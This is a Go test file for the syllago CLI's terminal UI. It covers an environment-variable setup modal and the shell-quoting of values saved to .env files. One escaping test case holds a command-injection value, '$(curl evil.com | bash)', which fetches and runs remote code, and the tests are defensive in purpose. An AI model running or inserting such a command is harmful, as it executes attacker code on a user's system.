package tui

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	tea "github.com/charmbracelet/bubbletea"

	"github.com/OpenScribbler/syllago/cli/internal/catalog"
	"github.com/OpenScribbler/syllago/cli/internal/installer"
)

func TestEnvSetupStart(t *testing.T) {
	app := navigateToDetailItem(t, catalog.MCP, "test-mcp")

	if app.detail.mcpConfig == nil {
		t.Fatal("mcpConfig should be parsed for MCP item")
	}

	// Unset the env vars so the wizard detects them
	for k := range app.detail.mcpConfig.Env {
		t.Setenv(k, "")
	}
	// At minimum, the mcpConfig should have env vars defined
	envStatus := installer.CheckEnvVars(app.detail.mcpConfig)
	if len(envStatus) == 0 {
		t.Fatal("expected env vars in MCP config")
	}
}

// TestEnvModalOpensFromKey tests that pressing 'e' on an MCP item with
// unset env vars sends an openEnvModalMsg.
func TestEnvModalOpensFromKey(t *testing.T) {
	app := navigateToDetailItem(t, catalog.MCP, "test-mcp")

	if app.detail.mcpConfig == nil {
		t.Fatal("expected mcpConfig to be parsed for MCP item")
	}

	// Ensure env vars are unset
	for k := range app.detail.mcpConfig.Env {
		os.Unsetenv(k)
	}

	// Switch to install tab
	m, _ := app.Update(keyRune('2'))
	app = m.(App)

	// Press 'e' to open env setup
	m, cmd := app.Update(keyRune('e'))
	app = m.(App)

	if cmd == nil {
		t.Fatal("pressing 'e' should return a cmd to open the env modal")
	}
	msg := cmd()
	if _, ok := msg.(openEnvModalMsg); !ok {
		t.Fatalf("expected openEnvModalMsg, got %T", msg)
	}
}

// TestEnvModalChooseNavigation tests up/down navigation on the choose step.
func TestEnvModalChooseNavigation(t *testing.T) {
	modal := newEnvSetupModal([]string{"API_KEY"})

	if modal.step != envStepChoose {
		t.Fatalf("expected envStepChoose, got %d", modal.step)
	}
	if modal.methodCursor != 0 {
		t.Fatalf("expected initial methodCursor 0, got %d", modal.methodCursor)
	}

	updated, _ := modal.Update(tea.KeyMsg{Type: tea.KeyDown})
	if updated.methodCursor != 1 {
		t.Fatalf("expected methodCursor 1 after down, got %d", updated.methodCursor)
	}

	// Bounds clamping
	updated, _ = updated.Update(tea.KeyMsg{Type: tea.KeyDown})
	if updated.methodCursor != 1 {
		t.Fatal("methodCursor should clamp at 1")
	}

	updated, _ = updated.Update(tea.KeyMsg{Type: tea.KeyUp})
	if updated.methodCursor != 0 {
		t.Fatalf("expected methodCursor 0 after up, got %d", updated.methodCursor)
	}
}

// TestEnvModalChooseNewValue tests that selecting "Set up new value" advances to envStepValue.
func TestEnvModalChooseNewValue(t *testing.T) {
	modal := newEnvSetupModal([]string{"API_KEY"})
	// methodCursor 0 = "Set up new value"
	updated, _ := modal.Update(tea.KeyMsg{Type: tea.KeyEnter})
	if updated.step != envStepValue {
		t.Fatalf("expected envStepValue, got %d", updated.step)
	}
}

// TestEnvModalChooseAlreadyConfigured tests that selecting "Already configured"
// advances to envStepSource.
func TestEnvModalChooseAlreadyConfigured(t *testing.T) {
	modal := newEnvSetupModal([]string{"API_KEY"})
	// Move to "Already configured"
	modal, _ = modal.Update(tea.KeyMsg{Type: tea.KeyDown})
	updated, _ := modal.Update(tea.KeyMsg{Type: tea.KeyEnter})
	if updated.step != envStepSource {
		t.Fatalf("expected envStepSource, got %d", updated.step)
	}
}

// TestEnvModalEscSkips tests that Esc on the choose step skips to the next var.
func TestEnvModalEscSkips(t *testing.T) {
	modal := newEnvSetupModal([]string{"API_KEY", "AUTH_TOKEN"})

	updated, _ := modal.Update(tea.KeyMsg{Type: tea.KeyEsc})
	if updated.varIdx != 1 {
		t.Fatalf("expected varIdx 1 after esc, got %d", updated.varIdx)
	}
	if !updated.active {
		t.Fatal("modal should still be active (more vars to process)")
	}
}

// TestEnvModalEscOnLastVarCloses tests that Esc on the last var closes the modal.
func TestEnvModalEscOnLastVarCloses(t *testing.T) {
	modal := newEnvSetupModal([]string{"API_KEY"})
	updated, _ := modal.Update(tea.KeyMsg{Type: tea.KeyEsc})
	if updated.active {
		t.Fatal("Esc on last var should close the modal")
	}
}

// TestEnvModalValueInput tests that entering a value advances to the location step.
func TestEnvModalValueInput(t *testing.T) {
	modal := newEnvSetupModal([]string{"API_KEY"})
	// Enter choose step → value step
	modal, _ = modal.Update(tea.KeyMsg{Type: tea.KeyEnter})

	// Type a value
	for _, r := range "my-secret" {
		modal, _ = modal.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{r}})
	}

	// Enter → location step
	updated, _ := modal.Update(tea.KeyMsg{Type: tea.KeyEnter})
	if updated.step != envStepLocation {
		t.Fatalf("expected envStepLocation after value entry, got %d", updated.step)
	}
}

// TestEnvModalValueEscGoesBack tests that Esc from value input goes back to choose.
func TestEnvModalValueEscGoesBack(t *testing.T) {
	modal := newEnvSetupModal([]string{"API_KEY"})
	modal, _ = modal.Update(tea.KeyMsg{Type: tea.KeyEnter}) // → value

	updated, _ := modal.Update(tea.KeyMsg{Type: tea.KeyEsc})
	if updated.step != envStepChoose {
		t.Fatalf("expected envStepChoose after esc from value, got %d", updated.step)
	}
}

// TestEnvModalSourceInput tests that entering a source path loads the env var
// and advances to the next var.
func TestEnvModalSourceInput(t *testing.T) {
	modal := newEnvSetupModal([]string{"TEST_VAR", "OTHER_VAR"})

	// Choose "Already configured"
	modal, _ = modal.Update(tea.KeyMsg{Type: tea.KeyDown})
	modal, _ = modal.Update(tea.KeyMsg{Type: tea.KeyEnter})

	if modal.step != envStepSource {
		t.Fatalf("expected envStepSource, got %d", modal.step)
	}

	// Create a test .env file
	envFile := filepath.Join(t.TempDir(), ".env")
	writeTestEnvFile(t, envFile, "TEST_VAR", "test-secret-value")

	// Set the input value and press enter
	modal.input.SetValue(envFile)
	updated, _ := modal.Update(tea.KeyMsg{Type: tea.KeyEnter})

	// Should advance to next var
	if updated.varIdx != 1 {
		t.Fatalf("expected varIdx 1, got %d", updated.varIdx)
	}
}

// TestEnvModalAllComplete tests that skipping all vars closes the modal.
func TestEnvModalAllComplete(t *testing.T) {
	modal := newEnvSetupModal([]string{"VAR_A", "VAR_B"})

	// Skip all vars with Esc
	modal, _ = modal.Update(tea.KeyMsg{Type: tea.KeyEsc}) // skip VAR_A
	modal, _ = modal.Update(tea.KeyMsg{Type: tea.KeyEsc}) // skip VAR_B

	if modal.active {
		t.Fatal("modal should be closed after all vars processed")
	}
}

func TestSaveEnvToFile_Escaping(t *testing.T) {
	tests := []struct {
		name     string
		key      string
		value    string
		wantLine string
	}{
		{
			name:     "simple value",
			key:      "API_KEY",
			value:    "abc123",
			wantLine: "API_KEY='abc123'",
		},
		{
			name:     "value with single quote",
			key:      "MESSAGE",
			value:    "it's working",
			wantLine: "MESSAGE='it'\\''s working'",
		},
		{
			name:     "value with dollar sign",
			key:      "PATH_VAR",
			value:    "$HOME/bin",
			wantLine: "PATH_VAR='$HOME/bin'",
		},
		{
			name:     "value with backticks",
			key:      "CMD",
			value:    "`whoami`",
			wantLine: "CMD='`whoami`'",
		},
		{
			name:     "value with double quotes",
			key:      "QUOTED",
			value:    `say "hello"`,
			wantLine: `QUOTED='say "hello"'`,
		},
		{
			name:     "malicious command injection attempt",
			key:      "EVIL",
			value:    "$(curl evil.com | bash)",
			wantLine: "EVIL='$(curl evil.com | bash)'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tmpDir := t.TempDir()
			envFile := filepath.Join(tmpDir, ".env")

			if err := saveEnvToFile(tt.key, tt.value, envFile); err != nil {
				t.Fatalf("saveEnvToFile failed: %v", err)
			}

			data, err := os.ReadFile(envFile)
			if err != nil {
				t.Fatal(err)
			}

			content := strings.TrimSpace(string(data))
			if content != tt.wantLine {
				t.Errorf("got %q, want %q", content, tt.wantLine)
			}

			// Verify the format uses single quotes
			if !strings.HasPrefix(content, tt.key+"='") {
				t.Errorf("value should be single-quoted, got: %s", content)
			}
		})
	}
}

// writeTestEnvFile creates a .env file with a single var=value pair.
func writeTestEnvFile(t *testing.T, path, name, value string) {
	t.Helper()
	content := name + `="` + value + `"` + "\n"
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write test .env file: %s", err)
	}
}
